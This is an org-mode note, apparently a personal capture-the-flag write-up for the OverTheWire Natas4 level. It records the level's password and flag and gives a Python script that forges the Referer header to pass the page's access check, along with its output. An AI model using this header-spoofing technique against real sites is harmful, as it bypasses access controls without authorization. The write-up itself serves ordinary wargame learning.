@@ -1,0 +1,54 @@
+:PROPERTIES:
+:ID:       d3e3a109-5359-41a3-8199-69555a926ca6
+:END:
+#+title: Natas4
+* Previous
+[[id:2041bd3d-7f8f-48f4-ad64-3a710eafb62d][Natas3]]
+
+* Password
+Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+* Flag
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+* Notes
+
+This page can only be accessed if we are comming from natas5.
+This is checked with the referers field in the headers of the GET request.
+
+
+#+begin_src python :results output
+#!/usr/bin/env python3
+
+import requests
+import re
+from natas_pass import passwords
+
+username = "natas4"
+password = passwords[username]
+
+url = "http://{}.natas.labs.overthewire.org/".format(username)
+
+response = requests.get(
+    url,
+    auth=(username, password),
+    headers={"Referer": "http://natas5.natas.labs.overthewire.org/"},
+)
+
+content = response.text
+# print(content)
+
+p = re.findall("([a-zA-Z0-9]{32})", content)
+if p and p[0] == password:  # filters out the previous password which is also in the page
+    p.pop(0)
+
+print(p[0])
+
+
+#+end_src
+
+#+RESULTS:
+: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+* Next
+[[id:4d555387-119c-40cc-8483-819b38b1ef08][Natas5]]
